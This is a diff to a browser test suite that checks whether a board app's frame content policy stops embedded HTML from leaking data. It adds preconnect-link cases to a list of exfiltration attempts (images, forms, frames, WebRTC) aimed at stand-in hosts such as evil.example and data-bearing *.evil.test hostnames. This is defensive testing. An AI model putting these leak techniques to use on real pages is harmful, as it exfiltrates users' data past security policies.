@@ -2,8 +2,8 @@
 // src/components/task/htmlFrame.ts) and the board's frame-src (index.html) let it load only its own inline scripts and
 // styles, data: URLs and libraries from the CDNs, and WebRTC is taken away from it (noWebRtc, HA-269). What's counted
 // is connections and UDP packets, not just requests, with hostnames that carry the data mapped to a local server
-// (--host-resolver-rules). Chrome still connects for a frame load the policy refuses, unless its "Preload pages" setting
-// is off (HA-269): the checks for what reaches nothing turn it off, and one shows what it does when it's on, as the docs
+// (--host-resolver-rules). Chrome still connects for a frame load the policy refuses, and for a <link rel=preconnect>,
+// unless its "Preload pages" setting is off (HA-269): the checks for what reaches nothing turn it off, and one shows what it does when it's on, as the docs
 // say. A srcdoc frame the page makes itself can still use WebRTC in a browser (not in the desktop app, see
 // electron/preload.cjs): that isn't checked here.
 import assert from "node:assert/strict";
@@ -86,6 +86,13 @@ const webRtc = (stun, turn) => `
     window.pc = pc;
   } catch {}`;
 
+/** A script that adds a <link rel=preconnect> to `host`.evil.test, on port `port`. */
+const preconnect = (host, port) => `
+  const pc = document.createElement("link");
+  pc.rel = "preconnect";
+  pc.href = "https://${host}.evil.test:${port}/";
+  document.head.append(pc);`;
+
 /**
  * What a page tries, to send `secret` out: everything here goes to `out` (the counting server), evil.example, a host
  * named after the data (`evil`'s port, as *.evil.test) or the STUN server (`stun`'s port).
@@ -94,6 +101,7 @@ const leaks = (out, evil, stun) => `
 <p id="secret">secret</p>
 <img src="${out}/img?d=secret"><img src="https://evil.example/img?d=secret">
 <link rel="stylesheet" href="${out}/css">
+<link rel="preconnect" href="https://secret-pc.evil.test:${evil}/">
 <div style="background: url(${out}/bg)">bg</div>
 <iframe src="${out}/frame"></iframe>
 <form id="post" action="${out}/form" method="post"><input name="d" value="secret"></form>
@@ -112,6 +120,7 @@ const leaks = (out, evil, stun) => `
     document.body.append(f);
     f.contentWindow.location.href = "https://secret" + i + ".evil.test:${evil}/";
   }
+  ${preconnect("secret-pcjs", evil)}
   window.rtc = typeof RTCPeerConnection;
   ${webRtc(stun, evil)}
   addEventListener("load", () => {
@@ -122,8 +131,9 @@ const leaks = (out, evil, stun) => `
   });
 </script>
 <iframe src="https://secret-src.evil.test:${evil}/"></iframe>
-<ia-html><template><p>nested</p><img src="${out}/nested-img"><iframe src="https://secret-nested.evil.test:${evil}/"></iframe><script>
+<ia-html><template><p>nested</p><img src="${out}/nested-img"><iframe src="https://secret-nested.evil.test:${evil}/"></iframe><link rel="preconnect" href="https://secret-nested-pc.evil.test:${evil}/"><script>
   fetch("${out}/nested-fetch").catch(() => {});
+  ${preconnect("secret-nested-pcjs", evil)}
   window.rtc = typeof RTCPeerConnection;
   ${webRtc(stun, evil)}
   parent.postMessage({ nested: "ran" }, "*");
@@ -217,17 +227,26 @@ for (const [name, wrap] of [
 }
 
 // What the docs say (docs/guide/board.md): with "Preload pages" on, Chrome looks up and connects to the host of a frame
-// load the policy refuses, sending the data in the hostname (TLS SNI too). Should this fail because Chrome no longer
-// does, say so where the docs and FRAME_CSP's comment name it.
-test("in Chrome with Preload pages on, a frame load the policy refuses still connects to the host it names", async () => {
+// load the policy refuses, and of a <link rel=preconnect> (in the page's HTML or added by its script), sending the data
+// in the hostname (TLS SNI too). Should this fail because Chrome no longer does, say so where the docs and FRAME_CSP's
+// comment name it.
+test("in Chrome with Preload pages on, a refused frame load and a preconnect link still connect to the host they name", async () => {
   sni.length = 0;
   const port = evil.address().port;
   const browser = await evilBrowser({ preload: true });
   await withBrowser(server, { browser, allowErrors: [/Content Security Policy|violates|Refused to/] }, async (ui) => {
-    await openDocument(ui, `<h1>Leaky</h1><iframe hidden src="https://secret.evil.test:${port}/"></iframe>`);
+    await openDocument(
+      ui,
+      `<h1>Leaky</h1><iframe hidden src="https://secret.evil.test:${port}/"></iframe><link rel="preconnect" href="https://secret-pc.evil.test:${port}/"><script>${preconnect("secret-pcjs", port)}</script>`,
+    );
+    const hosts = ["secret.evil.test", "secret-pc.evil.test", "secret-pcjs.evil.test"];
     const deadline = Date.now() + 5000;
-    while (!sni.includes("secret.evil.test") && Date.now() < deadline) await ui.page.waitForTimeout(100);
-    assert.ok(sni.includes("secret.evil.test"), `no connection carried the hostname: ${JSON.stringify(sni)}`);
+    while (!hosts.every((h) => sni.includes(h)) && Date.now() < deadline) await ui.page.waitForTimeout(100);
+    assert.deepEqual(
+      hosts.filter((h) => !sni.includes(h)),
+      [],
+      `no connection carried these hostnames: ${JSON.stringify(sni)}`,
+    );
   });
 });
 
